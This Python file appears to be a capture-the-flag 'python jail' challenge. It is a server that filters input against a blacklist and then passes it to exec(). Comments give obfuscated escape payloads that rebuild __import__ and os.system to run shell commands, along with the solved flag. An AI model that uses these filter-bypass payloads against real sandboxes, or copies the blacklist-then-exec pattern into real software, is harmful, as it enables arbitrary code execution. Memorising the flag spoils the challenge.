#!/usr/bin/env python3

# Reference : https://kalilal.medium.com/python-jail-escape-newbie-ctf-2019-7e3f7310f175

# Payload 1 : getattr(getattr(globals()["__builtins__"],"__im"+"port__")("o"+"s"),"sy"+"stem")("ls")
# Payload 2 : getattr(getattr(globals()["__builtins__"],"__im"+"port__")("o"+"s"),"sy"+"stem")("ca"+"t${IFS}b49ddf352c9d2cdf7b9cf26dfeff15ad5336944e772b9d0190095be946fe8af9.txt")

# Flag : kqctf{0h_h0w_1_w4n7_70_br34k_fr33_2398d89vj3nsoicifh3bdoq1b39049v}

def server():
    message = """
    You are in a maximum security prison. Can you escape?
"""
    print(message)
    while True:
        try:
            data = input("> ").strip("\n")
            safe = True
            for char in data:
                if not (ord(char)>=33 and ord(char)<=126):
                    print("[-] Badchar : ", char)
                    safe = False
            with open("blacklist.txt","r") as f:
                badwords = f.read().strip("\n").split(" ")
            for badword in badwords:
                if badword in data:
                    print("[-] Badword : ", badword)
                    safe = False
            if safe:
                print(exec(data))
            else:
                print("You used a bad word!")
        except Exception as e:
            print("Something went wrong.")
            print(e)
            exit()

if __name__ == "__main__":
    server()
